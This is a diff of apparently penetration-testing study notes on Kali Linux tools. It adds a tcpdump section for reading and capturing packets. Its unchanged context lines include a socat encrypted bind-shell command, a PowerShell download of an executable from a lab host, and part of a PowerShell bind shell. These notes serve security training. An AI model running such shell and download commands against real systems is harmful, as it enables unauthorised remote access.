@@ -58,6 +58,8 @@
     - [PowerShell File Transfers](#PowerShell-File-Transfers)
     - [PowerShell Reverse Shells](#PowerShell-Reverse-Shells)
     - [PowerShell Bind Shells](#PowerShell-Bind-Shells)
+
+    3.4. [tcpdump](#tcpdump)
 # Getting Comfortable with Kali Linux
 ## Finding Files in Kali Linux
 ### which 
@@ -382,7 +384,7 @@ kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXE
 #bind: use - to transfer data between STDIO and the remote host.
 C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0
 ```
-## PowerShell and Powercat
+## PowerShell
 ### PowerShell File Transfers
 ```cmd
 C:\Users\offsec> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
@@ -419,6 +421,17 @@ C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpLis
 kali@kali:~$ nc -nv 10.11.0.22 443
 ```
 *System.Net.Sockets.TcpListener class, 0.0.0.0 - local address*
+## tcpdump
+**Tcpdump** - text-based network sniffer. It can both capture traffic from the network and read existing capture files.
+```console
+#Display a pcap file
+kali@kali:~$ tcpdump -r password_cracking_filtered.pcap
+08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, w in 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
+#Display ips, filter and sort
+kali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}' | sort | uniq -c | head
+#Grab a packet capture on port 80
+kali@kali:~$ tcpdump tcp port 80 -w output.pcap -i eth0
+```
 
 
 
